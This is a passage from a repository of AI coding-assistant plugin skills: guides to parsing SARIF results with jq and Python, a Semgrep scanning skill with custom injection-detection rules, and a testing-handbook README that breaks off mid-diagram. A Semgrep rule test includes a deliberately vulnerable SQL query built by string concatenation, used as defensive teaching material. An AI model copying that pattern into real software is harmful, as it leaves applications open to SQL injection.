$schema: (optional, enables IDE validation)\n runs[] (array of analysis runs)\n     tool\n        driver\n           name (required)\n           version\n           rules[] (rule definitions)\n        extensions[] (plugins)\n     results[] (findings)\n        ruleId\n        level (error/warning/note)\n        message.text\n        locations[]\n           physicalLocation\n               artifactLocation.uri\n               region (startLine, startColumn, etc.)\n        fingerprints{}\n        partialFingerprints{}\n     artifacts[] (scanned files metadata)\n```\n\n### Why Fingerprinting Matters\n\nWithout stable fingerprints, you can't track findings across runs:\n\n- **Baseline comparison**: \"Is this a new finding or did we see it before?\"\n- **Regression detection**: \"Did this PR introduce new vulnerabilities?\"\n- **Suppression**: \"Ignore this known false positive in future runs\"\n\nTools report different paths (`/path/to/project/` vs `/github/workspace/`), so path-based matching fails. Fingerprints hash the *content* (code snippet, rule ID, relative location) to create stable identifiers regardless of environment.\n\n## Tool Selection Guide\n\n| Use Case | Tool | Installation |\n|----------|------|--------------|\n| Quick CLI queries | jq | `brew install jq` / `apt install jq` |\n| Python scripting (simple) | pysarif | `pip install pysarif` |\n| Python scripting (advanced) | sarif-tools | `pip install sarif-tools` |\n| .NET applications | SARIF SDK | NuGet package |\n| JavaScript/Node.js | sarif-js | npm package |\n| Go applications | garif | `go get github.com/chavacava/garif` |\n| Validation | SARIF Validator | sarifweb.azurewebsites.net |\n\n## Strategy 1: Quick Analysis with jq\n\nFor rapid exploration and one-off queries:\n\n```bash\n# Pretty print the file\njq '.' results.sarif\n\n# Count total findings\njq '[.runs[].results[]] | length' results.sarif\n\n# List all rule IDs triggered\njq '[.runs[].results[].ruleId] | unique' results.sarif\n\n# Extract errors only\njq '.runs[].results[] | select(.level == \"error\")' results.sarif\n\n# Get findings with file locations\njq '.runs[].results[] | {\n  rule: .ruleId,\n  message: .message.text,\n  file: .locations[0].physicalLocation.artifactLocation.uri,\n  line: .locations[0].physicalLocation.region.startLine\n}' results.sarif\n\n# Filter by severity and get count per rule\njq '[.runs[].results[] | select(.level == \"error\")] | group_by(.ruleId) | map({rule: .[0].ruleId, count: length})' results.sarif\n\n# Extract findings for a specific file\njq --arg file \"src/auth.py\" '.runs[].results[] | select(.locations[].physicalLocation.artifactLocation.uri | contains($file))' results.sarif\n```\n\n## Strategy 2: Python with pysarif\n\nFor programmatic access with full object model:\n\n```python\nfrom pysarif import load_from_file, save_to_file\n\n# Load SARIF file\nsarif = load_from_file(\"results.sarif\")\n\n# Iterate through runs and results\nfor run in sarif.runs:\n    tool_name = run.tool.driver.name\n    print(f\"Tool: {tool_name}\")\n\n    for result in run.results:\n        print(f\"  [{result.level}] {result.rule_id}: {result.message.text}\")\n\n        if result.locations:\n            loc = result.locations[0].physical_location\n            if loc and loc.artifact_location:\n                print(f\"    File: {loc.artifact_location.uri}\")\n                if loc.region:\n                    print(f\"    Line: {loc.region.start_line}\")\n\n# Save modified SARIF\nsave_to_file(sarif, \"modified.sarif\")\n```\n\n## Strategy 3: Python with sarif-tools\n\nFor aggregation, reporting, and CI/CD integration:\n\n```python\nfrom sarif import loader\n\n# Load single file\nsarif_data = loader.load_sarif_file(\"results.sarif\")\n\n# Or load multiple files\nsarif_set = loader.load_sarif_files([\"tool1.sarif\", \"tool2.sarif\"])\n\n# Get summary report\nreport = sarif_data.get_report()\n\n# Get histogram by severity\nerrors = report.get_issue_type_histogram_for_severity(\"error\")\nwarnings = report.get_issue_type_histogram_for_severity(\"warning\")\n\n# Filter results\nhigh_severity = [r for r in sarif_data.get_results()\n                 if r.get(\"level\") == \"error\"]\n```\n\n**sarif-tools CLI commands:**\n\n```bash\n# Summary of findings\nsarif summary results.sarif\n\n# List all results with details\nsarif ls results.sarif\n\n# Get results by severity\nsarif ls --level error results.sarif\n\n# Diff two SARIF files (find new/fixed issues)\nsarif diff baseline.sarif current.sarif\n\n# Convert to other formats\nsarif csv results.sarif > results.csv\nsarif html results.sarif > report.html\n```\n\n## Strategy 4: Aggregating Multiple SARIF Files\n\nWhen combining results from multiple tools:\n\n```python\nimport json\nfrom pathlib import Path\n\ndef aggregate_sarif_files(sarif_paths: list[str]) -> dict:\n    \"\"\"Combine multiple SARIF files into one.\"\"\"\n    aggregated = {\n        \"version\": \"2.1.0\",\n        \"$schema\": \"https://json.schemastore.org/sarif-2.1.0.json\",\n        \"runs\": []\n    }\n\n    for path in sarif_paths:\n        with open(path) as f:\n            sarif = json.load(f)\n            aggregated[\"runs\"].extend(sarif.get(\"runs\", []))\n\n    return aggregated\n\ndef deduplicate_results(sarif: dict) -> dict:\n    \"\"\"Remove duplicate findings based on fingerprints.\"\"\"\n    seen_fingerprints = set()\n\n    for run in sarif[\"runs\"]:\n        unique_results = []\n        for result in run.get(\"results\", []):\n            # Use partialFingerprints or create key from location\n            fp = None\n            if result.get(\"partialFingerprints\"):\n                fp = tuple(sorted(result[\"partialFingerprints\"].items()))\n            elif result.get(\"fingerprints\"):\n                fp = tuple(sorted(result[\"fingerprints\"].items()))\n            else:\n                # Fallback: create fingerprint from rule + location\n                loc = result.get(\"locations\", [{}])[0]\n                phys = loc.get(\"physicalLocation\", {})\n                fp = (\n                    result.get(\"ruleId\"),\n                    phys.get(\"artifactLocation\", {}).get(\"uri\"),\n                    phys.get(\"region\", {}).get(\"startLine\")\n                )\n\n            if fp not in seen_fingerprints:\n                seen_fingerprints.add(fp)\n                unique_results.append(result)\n\n        run[\"results\"] = unique_results\n\n    return sarif\n```\n\n## Strategy 5: Extracting Actionable Data\n\n```python\nimport json\nfrom dataclasses import dataclass\nfrom typing import Optional\n\n@dataclass\nclass Finding:\n    rule_id: str\n    level: str\n    message: str\n    file_path: Optional[str]\n    start_line: Optional[int]\n    end_line: Optional[int]\n    fingerprint: Optional[str]\n\ndef extract_findings(sarif_path: str) -> list[Finding]:\n    \"\"\"Extract structured findings from SARIF file.\"\"\"\n    with open(sarif_path) as f:\n        sarif = json.load(f)\n\n    findings = []\n    for run in sarif.get(\"runs\", []):\n        for result in run.get(\"results\", []):\n            loc = result.get(\"locations\", [{}])[0]\n            phys = loc.get(\"physicalLocation\", {})\n            region = phys.get(\"region\", {})\n\n            findings.append(Finding(\n                rule_id=result.get(\"ruleId\", \"unknown\"),\n                level=result.get(\"level\", \"warning\"),\n                message=result.get(\"message\", {}).get(\"text\", \"\"),\n                file_path=phys.get(\"artifactLocation\", {}).get(\"uri\"),\n                start_line=region.get(\"startLine\"),\n                end_line=region.get(\"endLine\"),\n                fingerprint=next(iter(result.get(\"partialFingerprints\", {}).values()), None)\n            ))\n\n    return findings\n\n# Filter and prioritize\ndef prioritize_findings(findings: list[Finding]) -> list[Finding]:\n    \"\"\"Sort findings by severity.\"\"\"\n    severity_order = {\"error\": 0, \"warning\": 1, \"note\": 2, \"none\": 3}\n    return sorted(findings, key=lambda f: severity_order.get(f.level, 99))\n```\n\n## Common Pitfalls and Solutions\n\n### 1. Path Normalization Issues\n\nDifferent tools report paths differently (absolute, relative, URI-encoded):\n\n```python\nfrom urllib.parse import unquote\nfrom pathlib import Path\n\ndef normalize_path(uri: str, base_path: str = \"\") -> str:\n    \"\"\"Normalize SARIF artifact URI to consistent path.\"\"\"\n    # Remove file:// prefix if present\n    if uri.startswith(\"file://\"):\n        uri = uri[7:]\n\n    # URL decode\n    uri = unquote(uri)\n\n    # Handle relative paths\n    if not Path(uri).is_absolute() and base_path:\n        uri = str(Path(base_path) / uri)\n\n    # Normalize separators\n    return str(Path(uri))\n```\n\n### 2. Fingerprint Mismatch Across Runs\n\nFingerprints may not match if:\n- File paths differ between environments\n- Tool versions changed fingerprinting algorithm\n- Code was reformatted (changing line numbers)\n\n**Solution:** Use multiple fingerprint strategies:\n\n```python\ndef compute_stable_fingerprint(result: dict, file_content: str = None) -> str:\n    \"\"\"Compute environment-independent fingerprint.\"\"\"\n    import hashlib\n\n    components = [\n        result.get(\"ruleId\", \"\"),\n        result.get(\"message\", {}).get(\"text\", \"\")[:100],  # First 100 chars\n    ]\n\n    # Add code snippet if available\n    if file_content and result.get(\"locations\"):\n        region = result[\"locations\"][0].get(\"physicalLocation\", {}).get(\"region\", {})\n        if region.get(\"startLine\"):\n            lines = file_content.split(\"\\n\")\n            line_idx = region[\"startLine\"] - 1\n            if 0 <= line_idx < len(lines):\n                # Normalize whitespace\n                components.append(lines[line_idx].strip())\n\n    return hashlib.sha256(\"\".join(components).encode()).hexdigest()[:16]\n```\n\n### 3. Missing or Incomplete Data\n\nSARIF allows many optional fields. Always use defensive access:\n\n```python\ndef safe_get_location(result: dict) -> tuple[str, int]:\n    \"\"\"Safely extract file and line from result.\"\"\"\n    try:\n        loc = result.get(\"locations\", [{}])[0]\n        phys = loc.get(\"physicalLocation\", {})\n        file_path = phys.get(\"artifactLocation\", {}).get(\"uri\", \"unknown\")\n        line = phys.get(\"region\", {}).get(\"startLine\", 0)\n        return file_path, line\n    except (IndexError, KeyError, TypeError):\n        return \"unknown\", 0\n```\n\n### 4. Large File Performance\n\nFor very large SARIF files (100MB+):\n\n```python\nimport ijson  # pip install ijson\n\ndef stream_results(sarif_path: str):\n    \"\"\"Stream results without loading entire file.\"\"\"\n    with open(sarif_path, \"rb\") as f:\n        # Stream through results arrays\n        for result in ijson.items(f, \"runs.item.results.item\"):\n            yield result\n```\n\n### 5. Schema Validation\n\nValidate before processing to catch malformed files:\n\n```bash\n# Using ajv-cli\nnpm install -g ajv-cli\najv validate -s sarif-schema-2.1.0.json -d results.sarif\n\n# Using Python jsonschema\npip install jsonschema\n```\n\n```python\nfrom jsonschema import validate, ValidationError\nimport json\n\ndef validate_sarif(sarif_path: str, schema_path: str) -> bool:\n    \"\"\"Validate SARIF file against schema.\"\"\"\n    with open(sarif_path) as f:\n        sarif = json.load(f)\n    with open(schema_path) as f:\n        schema = json.load(f)\n\n    try:\n        validate(sarif, schema)\n        return True\n    except ValidationError as e:\n        print(f\"Validation error: {e.message}\")\n        return False\n```\n\n## CI/CD Integration Patterns\n\n### GitHub Actions\n\n```yaml\n- name: Upload SARIF\n  uses: github/codeql-action/upload-sarif@v3\n  with:\n    sarif_file: results.sarif\n\n- name: Check for high severity\n  run: |\n    HIGH_COUNT=$(jq '[.runs[].results[] | select(.level == \"error\")] | length' results.sarif)\n    if [ \"$HIGH_COUNT\" -gt 0 ]; then\n      echo \"Found $HIGH_COUNT high severity issues\"\n      exit 1\n    fi\n```\n\n### Fail on New Issues\n\n```python\nfrom sarif import loader\n\ndef check_for_regressions(baseline: str, current: str) -> int:\n    \"\"\"Return count of new issues not in baseline.\"\"\"\n    baseline_data = loader.load_sarif_file(baseline)\n    current_data = loader.load_sarif_file(current)\n\n    baseline_fps = {get_fingerprint(r) for r in baseline_data.get_results()}\n    new_issues = [r for r in current_data.get_results()\n                  if get_fingerprint(r) not in baseline_fps]\n\n    return len(new_issues)\n```\n\n## Key Principles\n\n1. **Validate first**: Check SARIF structure before processing\n2. **Handle optionals**: Many fields are optional; use defensive access\n3. **Normalize paths**: Tools report paths differently; normalize early\n4. **Fingerprint wisely**: Combine multiple strategies for stable deduplication\n5. **Stream large files**: Use ijson or similar for 100MB+ files\n6. **Aggregate thoughtfully**: Preserve tool metadata when combining files\n\n## Skill Resources\n\nFor ready-to-use query templates, see [{baseDir}/resources/jq-queries.md]({baseDir}/resources/jq-queries.md):\n- 40+ jq queries for common SARIF operations\n- Severity filtering, rule extraction, aggregation patterns\n\nFor Python utilities, see [{baseDir}/resources/sarif_helpers.py]({baseDir}/resources/sarif_helpers.py):\n- `normalize_path()` - Handle tool-specific path formats\n- `compute_fingerprint()` - Stable fingerprinting ignoring paths\n- `deduplicate_results()` - Remove duplicates across runs\n\n## Reference Links\n\n- [OASIS SARIF 2.1.0 Specification](https://docs.oasis-open.org/sarif/sarif/v2.1.0/sarif-v2.1.0.html)\n- [Microsoft SARIF Tutorials](https://github.com/microsoft/sarif-tutorials)\n- [SARIF SDK (.NET)](https://github.com/microsoft/sarif-sdk)\n- [sarif-tools (Python)](https://github.com/microsoft/sarif-tools)\n- [pysarif (Python)](https://github.com/Kjeld-P/pysarif)\n- [GitHub SARIF Support](https://docs.github.com/en/code-security/code-scanning/integrating-with-code-scanning/sarif-support-for-code-scanning)\n- [SARIF Validator](https://sarifweb.azurewebsites.net/)\n",
        "plugins/static-analysis/skills/sarif-parsing/resources/jq-queries.md": "# SARIF jq Query Reference\n\nReady-to-use jq queries for common SARIF parsing tasks.\n\n## Basic Exploration\n\n```bash\n# Pretty print\njq '.' results.sarif\n\n# Get SARIF version\njq '.version' results.sarif\n\n# List tool names from all runs\njq '.runs[].tool.driver.name' results.sarif\n\n# Count runs\njq '.runs | length' results.sarif\n```\n\n## Result Queries\n\n```bash\n# Total result count\njq '[.runs[].results[]] | length' results.sarif\n\n# Count by severity level\njq 'reduce .runs[].results[] as $r ({}; .[$r.level] += 1)' results.sarif\n\n# List unique rule IDs\njq '[.runs[].results[].ruleId] | unique | sort' results.sarif\n\n# Count per rule\njq '[.runs[].results[]] | group_by(.ruleId) | map({rule: .[0].ruleId, count: length}) | sort_by(-.count)' results.sarif\n```\n\n## Filtering Results\n\n```bash\n# Only errors\njq '.runs[].results[] | select(.level == \"error\")' results.sarif\n\n# Only warnings\njq '.runs[].results[] | select(.level == \"warning\")' results.sarif\n\n# By specific rule ID\njq --arg rule \"SQL_INJECTION\" '.runs[].results[] | select(.ruleId == $rule)' results.sarif\n\n# By file path (contains)\njq --arg file \"auth\" '.runs[].results[] | select(.locations[].physicalLocation.artifactLocation.uri | contains($file))' results.sarif\n\n# By file extension\njq '.runs[].results[] | select(.locations[].physicalLocation.artifactLocation.uri | test(\"\\\\.py$\"))' results.sarif\n\n# Multiple conditions\njq '.runs[].results[] | select(.level == \"error\" and (.ruleId | startswith(\"SEC\")))' results.sarif\n```\n\n## Extracting Locations\n\n```bash\n# File and line for each result\njq '.runs[].results[] | {\n  rule: .ruleId,\n  file: .locations[0].physicalLocation.artifactLocation.uri,\n  line: .locations[0].physicalLocation.region.startLine\n}' results.sarif\n\n# Unique affected files\njq '[.runs[].results[].locations[].physicalLocation.artifactLocation.uri] | unique | sort' results.sarif\n\n# Results grouped by file\njq '[.runs[].results[] | {file: .locations[0].physicalLocation.artifactLocation.uri, result: .}] | group_by(.file) | map({file: .[0].file, count: length})' results.sarif\n```\n\n## Rule Information\n\n```bash\n# List all rules with severity\njq '.runs[].tool.driver.rules[] | {id: .id, name: .name, level: .defaultConfiguration.level}' results.sarif\n\n# Get rule description by ID\njq --arg id \"RULE001\" '.runs[].tool.driver.rules[] | select(.id == $id)' results.sarif\n\n# Rules with help URLs\njq '.runs[].tool.driver.rules[] | select(.helpUri) | {id: .id, help: .helpUri}' results.sarif\n```\n\n## Fingerprints\n\n```bash\n# Results with fingerprints\njq '.runs[].results[] | select(.fingerprints or .partialFingerprints) | {rule: .ruleId, fp: (.fingerprints // .partialFingerprints)}' results.sarif\n\n# Extract all partial fingerprints\njq '[.runs[].results[].partialFingerprints] | add' results.sarif\n```\n\n## Aggregation and Reporting\n\n```bash\n# Summary by severity and rule\njq '[.runs[].results[]] | group_by(.level) | map({level: .[0].level, rules: (group_by(.ruleId) | map({rule: .[0].ruleId, count: length}))})' results.sarif\n\n# Top 10 most frequent rules\njq '[.runs[].results[]] | group_by(.ruleId) | map({rule: .[0].ruleId, count: length}) | sort_by(-.count) | .[0:10]' results.sarif\n\n# Files with most issues\njq '[.runs[].results[] | .locations[0].physicalLocation.artifactLocation.uri] | group_by(.) | map({file: .[0], count: length}) | sort_by(-.count) | .[0:10]' results.sarif\n```\n\n## Output Formatting\n\n```bash\n# CSV-like output\njq -r '.runs[].results[] | [.ruleId, .level, .locations[0].physicalLocation.artifactLocation.uri, .locations[0].physicalLocation.region.startLine, .message.text] | @csv' results.sarif\n\n# Tab-separated\njq -r '.runs[].results[] | [.ruleId, .level, .locations[0].physicalLocation.artifactLocation.uri // \"N/A\"] | @tsv' results.sarif\n\n# Markdown table\necho \"| Rule | Level | File | Line |\"\necho \"|------|-------|------|------|\"\njq -r '.runs[].results[] | \"| \\(.ruleId) | \\(.level) | \\(.locations[0].physicalLocation.artifactLocation.uri // \"N/A\") | \\(.locations[0].physicalLocation.region.startLine // \"N/A\") |\"' results.sarif\n```\n\n## Comparison and Diff\n\n```bash\n# Find rules in file1 not in file2\ncomm -23 <(jq -r '[.runs[].results[].ruleId] | unique | sort[]' file1.sarif) <(jq -r '[.runs[].results[].ruleId] | unique | sort[]' file2.sarif)\n\n# Compare result counts\necho \"File 1: $(jq '[.runs[].results[]] | length' file1.sarif)\"\necho \"File 2: $(jq '[.runs[].results[]] | length' file2.sarif)\"\n```\n\n## Transformation\n\n```bash\n# Extract minimal SARIF (results only)\njq '{version: .version, runs: [.runs[] | {tool: {driver: {name: .tool.driver.name}}, results: .results}]}' results.sarif\n\n# Filter and create new SARIF with only errors\njq '.runs[].results = [.runs[].results[] | select(.level == \"error\")]' results.sarif > errors-only.sarif\n\n# Merge multiple SARIF files\njq -s '{version: \"2.1.0\", runs: [.[].runs[]]}' file1.sarif file2.sarif > merged.sarif\n```\n\n## Validation Checks\n\n```bash\n# Check if version is 2.1.0\njq -e '.version == \"2.1.0\"' results.sarif && echo \"Valid version\" || echo \"Invalid version\"\n\n# Check for empty results\njq -e '[.runs[].results[]] | length > 0' results.sarif && echo \"Has results\" || echo \"No results\"\n\n# Verify all results have locations\njq '[.runs[].results[] | select(.locations | length == 0)] | length' results.sarif\n```\n",
        "plugins/static-analysis/skills/semgrep/SKILL.md": "---\nname: semgrep\ndescription: Run Semgrep static analysis for fast security scanning and pattern matching. Use when asked to scan code with Semgrep, write custom YAML rules, find vulnerabilities quickly, use taint mode, or set up Semgrep in CI/CD pipelines.\nallowed-tools:\n  - Bash\n  - Read\n  - Glob\n  - Grep\n---\n\n# Semgrep Static Analysis\n\n## When to Use Semgrep\n\n**Ideal scenarios:**\n- Quick security scans (minutes, not hours)\n- Pattern-based bug detection\n- Enforcing coding standards and best practices\n- Finding known vulnerability patterns\n- Single-file analysis without complex data flow\n- First-pass analysis before deeper tools\n\n**Consider CodeQL instead when:**\n- Need interprocedural taint tracking across files\n- Complex data flow analysis required\n- Analyzing custom proprietary frameworks\n\n## When NOT to Use\n\nDo NOT use this skill for:\n- Complex interprocedural data flow analysis (use CodeQL instead)\n- Binary analysis or compiled code without source\n- Custom deep semantic analysis requiring AST/CFG traversal\n- When you need to track taint across many function boundaries\n\n## Installation\n\n```bash\n# pip\npython3 -m pip install semgrep\n\n# Homebrew\nbrew install semgrep\n\n# Docker\ndocker run --rm -v \"${PWD}:/src\" returntocorp/semgrep semgrep --config auto /src\n\n# Update\npip install --upgrade semgrep\n```\n\n## Core Workflow\n\n### 1. Quick Scan\n\n```bash\nsemgrep --config auto .                    # Auto-detect rules\nsemgrep --config auto --metrics=off .      # Disable telemetry for proprietary code\n```\n\n### 2. Use Rulesets\n\n```bash\nsemgrep --config p/<RULESET> .             # Single ruleset\nsemgrep --config p/security-audit --config p/trailofbits .  # Multiple\n```\n\n| Ruleset | Description |\n|---------|-------------|\n| `p/default` | General security and code quality |\n| `p/security-audit` | Comprehensive security rules |\n| `p/owasp-top-ten` | OWASP Top 10 vulnerabilities |\n| `p/cwe-top-25` | CWE Top 25 vulnerabilities |\n| `p/r2c-security-audit` | r2c security audit rules |\n| `p/trailofbits` | Trail of Bits security rules |\n| `p/python` | Python-specific |\n| `p/javascript` | JavaScript-specific |\n| `p/golang` | Go-specific |\n\n### 3. Output Formats\n\n```bash\nsemgrep --config p/security-audit --sarif -o results.sarif .   # SARIF\nsemgrep --config p/security-audit --json -o results.json .     # JSON\nsemgrep --config p/security-audit --dataflow-traces .          # Show data flow\n```\n\n### 4. Scan Specific Paths\n\n```bash\nsemgrep --config p/python app.py           # Single file\nsemgrep --config p/javascript src/         # Directory\nsemgrep --config auto --include='**/test/**' .  # Include tests (excluded by default)\n```\n\n## Writing Custom Rules\n\n### Basic Structure\n\n```yaml\nrules:\n  - id: hardcoded-password\n    languages: [python]\n    message: \"Hardcoded password detected: $PASSWORD\"\n    severity: ERROR\n    pattern: password = \"$PASSWORD\"\n```\n\n### Pattern Syntax\n\n| Syntax | Description | Example |\n|--------|-------------|---------|\n| `...` | Match anything | `func(...)` |\n| `$VAR` | Capture metavariable | `$FUNC($INPUT)` |\n| `<... ...>` | Deep expression match | `<... user_input ...>` |\n\n### Pattern Operators\n\n| Operator | Description |\n|----------|-------------|\n| `pattern` | Match exact pattern |\n| `patterns` | All must match (AND) |\n| `pattern-either` | Any matches (OR) |\n| `pattern-not` | Exclude matches |\n| `pattern-inside` | Match only inside context |\n| `pattern-not-inside` | Match only outside context |\n| `pattern-regex` | Regex matching |\n| `metavariable-regex` | Regex on captured value |\n| `metavariable-comparison` | Compare values |\n\n### Combining Patterns\n\n```yaml\nrules:\n  - id: sql-injection\n    languages: [python]\n    message: \"Potential SQL injection\"\n    severity: ERROR\n    patterns:\n      - pattern-either:\n          - pattern: cursor.execute($QUERY)\n          - pattern: db.execute($QUERY)\n      - pattern-not:\n          - pattern: cursor.execute(\"...\", (...))\n      - metavariable-regex:\n          metavariable: $QUERY\n          regex: .*\\+.*|.*\\.format\\(.*|.*%.*\n```\n\n### Taint Mode (Data Flow)\n\nSimple pattern matching finds obvious cases:\n\n```python\n# Pattern `os.system($CMD)` catches this:\nos.system(user_input)  # Found\n```\n\nBut misses indirect flows:\n\n```python\n# Same pattern misses this:\ncmd = user_input\nprocessed = cmd.strip()\nos.system(processed)  # Missed - no direct match\n```\n\nTaint mode tracks data through assignments and transformations:\n- **Source**: Where untrusted data enters (`user_input`)\n- **Propagators**: How it flows (`cmd = ...`, `processed = ...`)\n- **Sanitizers**: What makes it safe (`shlex.quote()`)\n- **Sink**: Where it becomes dangerous (`os.system()`)\n\n```yaml\nrules:\n  - id: command-injection\n    languages: [python]\n    message: \"User input flows to command execution\"\n    severity: ERROR\n    mode: taint\n    pattern-sources:\n      - pattern: request.args.get(...)\n      - pattern: request.form[...]\n      - pattern: request.json\n    pattern-sinks:\n      - pattern: os.system($SINK)\n      - pattern: subprocess.call($SINK, shell=True)\n      - pattern: subprocess.run($SINK, shell=True, ...)\n    pattern-sanitizers:\n      - pattern: shlex.quote(...)\n      - pattern: int(...)\n```\n\n### Full Rule with Metadata\n\n```yaml\nrules:\n  - id: flask-sql-injection\n    languages: [python]\n    message: \"SQL injection: user input flows to query without parameterization\"\n    severity: ERROR\n    metadata:\n      cwe: \"CWE-89: SQL Injection\"\n      owasp: \"A03:2021 - Injection\"\n      confidence: HIGH\n    mode: taint\n    pattern-sources:\n      - pattern: request.args.get(...)\n      - pattern: request.form[...]\n      - pattern: request.json\n    pattern-sinks:\n      - pattern: cursor.execute($QUERY)\n      - pattern: db.execute($QUERY)\n    pattern-sanitizers:\n      - pattern: int(...)\n    fix: cursor.execute($QUERY, (params,))\n```\n\n## Testing Rules\n\n### Test File Format\n\n```python\n# test_rule.py\ndef test_vulnerable():\n    user_input = request.args.get(\"id\")\n    # ruleid: flask-sql-injection\n    cursor.execute(\"SELECT * FROM users WHERE id = \" + user_input)\n\ndef test_safe():\n    user_input = request.args.get(\"id\")\n    # ok: flask-sql-injection\n    cursor.execute(\"SELECT * FROM users WHERE id = ?\", (user_input,))\n```\n\n```bash\nsemgrep --test rules/\n```\n\n## CI/CD Integration (GitHub Actions)\n\n```yaml\nname: Semgrep\n\non:\n  push:\n    branches: [main]\n  pull_request:\n  schedule:\n    - cron: '0 0 1 * *'  # Monthly\n\njobs:\n  semgrep:\n    runs-on: ubuntu-latest\n    container:\n      image: returntocorp/semgrep\n\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0  # Required for diff-aware scanning\n\n      - name: Run Semgrep\n        run: |\n          if [ \"${{ github.event_name }}\" = \"pull_request\" ]; then\n            semgrep ci --baseline-commit ${{ github.event.pull_request.base.sha }}\n          else\n            semgrep ci\n          fi\n        env:\n          SEMGREP_RULES: >-\n            p/security-audit\n            p/owasp-top-ten\n            p/trailofbits\n```\n\n## Configuration\n\n### .semgrepignore\n\n```\ntests/fixtures/\n**/testdata/\ngenerated/\nvendor/\nnode_modules/\n```\n\n### Suppress False Positives\n\n```python\npassword = get_from_vault()  # nosemgrep: hardcoded-password\ndangerous_but_safe()  # nosemgrep\n```\n\n## Performance\n\n```bash\nsemgrep --config rules/ --time .    # Check rule performance\nulimit -n 4096                       # Increase file descriptors for large codebases\n```\n\n### Path Filtering in Rules\n\n```yaml\nrules:\n  - id: my-rule\n    paths:\n      include: [src/]\n      exclude: [src/generated/]\n```\n\n## Third-Party Rules\n\n```bash\npip install semgrep-rules-manager\nsemgrep-rules-manager --dir ~/semgrep-rules download\nsemgrep -f ~/semgrep-rules .\n```\n\n## Rationalizations to Reject\n\n| Shortcut | Why It's Wrong |\n|----------|----------------|\n| \"Semgrep found nothing, code is clean\" | Semgrep is pattern-based; it can't track complex data flow across functions |\n| \"I wrote a rule, so we're covered\" | Rules need testing with `semgrep --test`; false negatives are silent |\n| \"Taint mode catches injection\" | Only if you defined all sources, sinks, AND sanitizers correctly |\n| \"Pro rules are comprehensive\" | Pro rules are good but not exhaustive; supplement with custom rules for your codebase |\n| \"Too many findings = noisy tool\" | High finding count often means real problems; tune rules, don't disable them |\n\n## Resources\n\n- Registry: https://semgrep.dev/explore\n- Playground: https://semgrep.dev/playground\n- Docs: https://semgrep.dev/docs/\n- Trail of Bits Rules: https://github.com/trailofbits/semgrep-rules\n- Blog: https://semgrep.dev/blog/\n",
        "plugins/testing-handbook-skills/.claude-plugin/plugin.json": "{\n  \"name\": \"testing-handbook-skills\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Skills from the Trail of Bits Application Security Testing Handbook (appsec.guide)\",\n  \"author\": {\n    \"name\": \"Pawe Patek\"\n  }\n}\n",
        "plugins/testing-handbook-skills/README.md": "# Testing Handbook Skills\n\nMeta-skill that generates Claude Code skills from the [Trail of Bits Application Security Testing Handbook](https://appsec.guide).\n\n## Overview\n\nThis plugin provides a skill generator that:\n\n1. Analyzes the Testing Handbook structure\n2. Identifies skill candidates (tools, techniques, domains)\n3. Generates skills using appropriate templates\n4. Validates generated skills\n\n## Installation\n\nAdd to your Claude Code skills configuration:\n\n```bash\n# From the skills marketplace\nclaude skills install testing-handbook-skills\n\n# Or manually add to .claude/settings.json\n{\n  \"plugins\": [\n    \"./plugins/testing-handbook-skills\"\n  ]\n}\n```\n\n## Usage\n\n### Generate All Skills\n\n```\nGenerate skills from the testing handbook\n```\n\nThis will:\n1. Locate the handbook (check common locations, ask user, or clone)\n2. Scan the handbook structure\n3. Present a plan of skills to generate\n4. On approval, generate skills as siblings to `testing-handbook-generator/`\n\n### Generate Specific Skill\n\n```\nCreate a skill for the libFuzzer section of the testing handbook\n```\n\n## Structure\n\n```\nplugins/testing-handbook-skills/\n .claude-plugin/\n    plugin.json\n scripts/\n    validate-skills.py        # Skill validation tool\n skills/\n    testing-handbook-generator/\n       SKILL.md              # Main skill entry point\n       discovery.md          # Handbook analysis methodology\n       testing.md            # Validation strategy\n       agent-prompt.md       # Agent prompt template for generation\n       templates/            # Skill generation templates\n           tool-skill.md     # Semgrep, CodeQL\n           fuzzer-skill.md   # libFuzzer, AFL++, cargo-fuzz\n           technique-skill.md # Harness writing, coverage\n           domain-skill.md   # Crypto testing, web security\n    [generated-skill]/        # Generated skills (siblings to generator)\n       SKILL.md\n    ...\n README.md\n```\n\n### Scripts\n\n| Script | Purpose |\n|--------|---------|\n| `validate-skills.py` | Validates generated skills (YAML, sections, line count, shortcodes, cross-refs) |\n\n```bash\n# Validate all skills\nuv run scripts/validate-skills.py\n\n# Validate specific skill\nuv run scripts/validate-skills.py --skill libfuzzer\n\n# JSON output for CI\nuv run scripts/validate-skills.py --json\n```\n\n## Skill Types\n\n| Type | Template | Example Sources |\n|------|----------|-----------------|\n| Tool | tool-skill.md | Semgrep, CodeQL |\n| Fuzzer | fuzzer-skill.md | libFuzzer, AFL++, cargo-fuzz |\n| Technique | technique-skill.md | Harness writing, coverage analysis |\n| Domain | domain-skill.md | Wycheproof, constant-time testing |\n\n## Generated Skills\n\nGenerated skills are written as siblings to the generator:\n```\nskills/[skill-name]/SKILL.md\n```\n\nEach generated skill:\n- Follows the appropriate template structure\n- Contains content extracted from the handbook\n- Includes resource links (WebFetch summaries for non-videos)\n- Is validated with `scripts/validate-skills.py` before delivery\n\n## Skills Cross-Reference\n\nThis graph shows the 16 generated skills and their cross-references (from the Related Skills section of each skill). Only links between actually generated skills are shown.\n\n```mermaid\ngraph TB\n    subgraph Fuzzers\n        libfuzzer[libfuzzer]\n        aflpp[aflpp]\n        libafl[libafl]\n        cargo-fuzz[cargo-fuzz]\n        atheris[atheris]\n        ruzzy[ruzzy]\n    end\n\n    subgraph Techniques\n        harness-writing[harness-writing]\n        address-sanitizer[address-sanitizer]\n        coverage-analysis[coverage-analysis]\n        fuzzing-dictionary[fuzzing-dictionary]\n        fuzzing-obstacles[fuzzing-obstacles]\n        ossfuzz[ossfuzz]\n    end\n\n    subgraph Tools\n        semgrep[semgrep]\n        codeql[codeql]\n    end\n\n    subgraph Domain\n        wycheproof[wycheproof]\n        constant-time-testing[constant-time-testing]\n    end\n\n    %% Fuzzer  Technique references\n    libfuzzer --> address-sanitizer\n    libfuzzer --> coverage-analysis\n    aflpp --> address-sanitizer\n    cargo-fuzz --> address-sanitizer\n    cargo-fuzz --> coverage-analysis\n    libafl --> address-sanitizer\n    libafl --> coverage-analysis\n    atheris --> address-sanitizer\n    atheris --> coverage-analysis\n    ruzzy --> address-sanitizer\n\n    %% Fuzzer  Fuzzer alternatives\n    libfuzzer -.-> aflpp\n    libfuzzer -.-> libafl\n    aflpp -.-> libfuzzer\n    aflpp -.-> libafl\n  